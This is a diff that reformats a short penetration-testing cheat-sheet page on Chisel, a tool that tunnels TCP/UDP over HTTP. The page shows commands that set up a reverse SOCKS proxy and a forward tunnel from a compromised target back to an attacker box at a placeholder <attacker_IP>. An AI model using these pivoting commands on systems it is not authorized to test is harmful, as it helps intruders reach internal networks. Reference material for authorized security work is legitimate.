@@ -1,28 +1,39 @@
 ---
 title: "Chisel"
 ---
+
 TCP/UDP tunnel over HTTP: useful when only port 80/443 is allowed outbound, or when you need a quick SOCKS proxy through a compromised host.
 
 ## Reverse SOCKS Tunnel
 
-Run the server on your attack box with `--reverse`, then have the target connect out: the SOCKS proxy binds on your side at port 1080.
+Run the server on your attack box with `--reverse`, then have the target connect out. The SOCKS proxy binds on your side at port 1080.
 
-```bash
-# Attacker
-chisel server -p 8000 --reverse
-
-# Target
-./chisel client <attacker_IP>:8000 R:socks
-```
+<Tabs>
+  <Tab title="Attacker">
+    ```bash wrap
+    chisel server -p 8000 --reverse
+    ```
+  </Tab>
+  <Tab title="Target">
+    ```bash wrap
+    ./chisel client <attacker_IP>:8000 R:socks
+    ```
+  </Tab>
+</Tabs>
 
 ## Forward Tunnel
 
 Forward a specific remote port to your local machine: useful for reaching a service on an internal host through the pivot.
 
-```bash
-# Attacker
-chisel server -p 8000
-
-# Target
-./chisel client <attacker_IP>:8000 <local_port>:<target_IP>:<target_port>
-```
+<Tabs>
+  <Tab title="Attacker">
+    ```bash wrap
+    chisel server -p 8000
+    ```
+  </Tab>
+  <Tab title="Target">
+    ```bash wrap
+    ./chisel client <attacker_IP>:8000 <local_port>:<target_IP>:<target_port>
+    ```
+  </Tab>
+</Tabs>
